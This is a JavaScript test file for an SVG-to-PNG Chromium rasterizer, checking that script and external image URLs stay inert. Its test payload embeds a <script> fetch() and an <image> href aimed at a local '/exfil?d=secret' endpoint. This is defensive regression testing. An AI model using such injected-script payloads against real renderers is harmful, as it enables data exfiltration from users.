// PR20 H-01: the real rasterizer cannot run design script or make a network request.
import http from 'node:http';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, test } from 'vitest';
import { chromiumRasterize } from '../../backend/services/branding/card-tool.js';

let server;
let port;
let requests;
let dir;

beforeEach(async () => {
  requests = [];
  dir = await fs.mkdtemp(path.join(os.tmpdir(), 'neuma-card-raster-'));
  server = http.createServer((req, res) => {
    requests.push(req.url);
    res.writeHead(200, { 'content-type': 'image/png' });
    res.end();
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  port = server.address().port;
});

afterEach(async () => {
  await new Promise((resolve) => server.close(resolve));
  await fs.rm(dir, { recursive: true, force: true });
});

describe('card Chromium boundary', () => {
  test('PR20 H-01: script and external image URLs stay inert in the real browser', async () => {
    const target = `http://127.0.0.1:${port}/exfil?d=secret`;
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><script>fetch(${JSON.stringify(target)})</script><image href="${target}" width="20" height="20"/><rect width="20" height="20" fill="#000"/></svg>`;
    const out = path.join(dir, 'card.png');
    await chromiumRasterize(svg, out, { width: 20, height: 20, scale: 1 });
    await new Promise((resolve) => setTimeout(resolve, 150));
    expect(requests).toEqual([]);
    expect((await fs.stat(out)).size).toBeGreaterThan(50);
  }, 60000);
});
